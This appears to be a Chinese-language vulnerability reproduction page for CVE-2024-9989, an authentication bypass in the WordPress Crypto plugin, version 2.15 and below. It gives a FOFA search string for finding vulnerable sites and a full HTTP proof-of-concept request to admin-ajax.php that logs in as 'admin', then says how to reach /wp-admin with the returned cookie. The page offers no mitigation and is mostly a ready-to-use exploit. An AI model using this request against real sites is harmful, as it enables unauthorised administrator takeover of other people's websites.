# WordPress插件Crypto身份认证绕过漏洞复现(CVE-2024-9989)

WordPress 的 Crypto 插件在 2.15 及以下版本（包括 2.15）中容易受到身份验证绕过攻击。这是由于对 'crypto_connect_ajax_process' 函数中 'crypto_connect_ajax_process：：log_in' 函数的任意方法调用有限。这使得未经身份验证的攻击者可以以站点上的任何现有用户（例如管理员）身份登录（如果他们有权访问用户名）

## fofa
```javascript
"wp-content/plugins/crypto/"
```

## poc
```javascript
GET /wp-admin/admin-ajax.php?action=crypto_connect_ajax_process&method_name=register&param1=admin HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501041352219.webp)

**成功会显示Success 并赋予Cookie 然后再访问/wp-admin 即可登入管理账号.**

![图片](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202501041352673.webp)

## 漏洞来源

- https://mp.weixin.qq.com/s/hC8A1DeS-LWGpNIFKeiMBQ